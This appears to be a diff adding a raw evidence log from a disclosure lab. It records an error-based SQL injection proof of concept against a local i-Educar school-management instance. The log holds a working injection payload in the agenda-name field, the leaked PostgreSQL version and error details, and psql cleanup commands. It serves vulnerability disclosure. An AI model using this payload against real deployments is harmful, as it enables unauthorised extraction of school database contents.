@@ -1,0 +1,23 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:25.028874+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+
+### control: POST tipoacao=Novo nm_agenda=i_explorar_poc09_benign
+HTTP 302 location=agenda_admin_lst.php
+
+### injection: POST tipoacao=Novo nm_agenda=teste' || CAST((SELECT version()) AS INT) || '
+HTTP 500 content-length=1293294
+
+--- extracted PostgreSQL error lines ---
+Illuminate\Database\QueryException: SQLSTATE[22P02]: Invalid text representation: 7 ERROR: invalid input syntax for type integer: "PostgreSQL 17.11 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit" (Connection: pgsql, Host: postgres, Port: 5432, Database: ieducar, SQL: INSERT 
+SQLSTATE[22P02]: Invalid text representation: 7 ERROR: invalid input syntax for type integer: "PostgreSQL 17.11 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit" (Connection: pgsql, Host: postgres, Port: 5432, Database: ieducar, SQL: INSERT INTO portal.agenda( ref_ref_cod_pess
+window.data = {"report":{"notifier":"Laravel Client","language":"PHP","framework_version":"12.61.0","language_version":"8.4.25","exception_class":"Illuminate\\Database\\QueryException","seen_at":1789085845,"message":"SQLSTATE[22P02]: Invalid text representation: 7 ERROR: invalid input syntax for typ
+--- end extracted PostgreSQL error lines ---
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T postgres psql -U ieducar -d ieducar -tAc DELETE FROM portal.agenda_responsavel WHERE ref_cod_agenda IN (SELECT cod_agenda FROM portal.agenda WHERE nm_agenda = 'i_explorar_poc09_benign'); DELETE FROM portal.agenda WHERE nm_agenda = 'i_explorar_poc09_benign';
+
+--- psql output ---
+DELETE 1
+DELETE 1
+--- end psql output ---
+# finished_at: 2026-09-11T00:17:25.811690+00:00
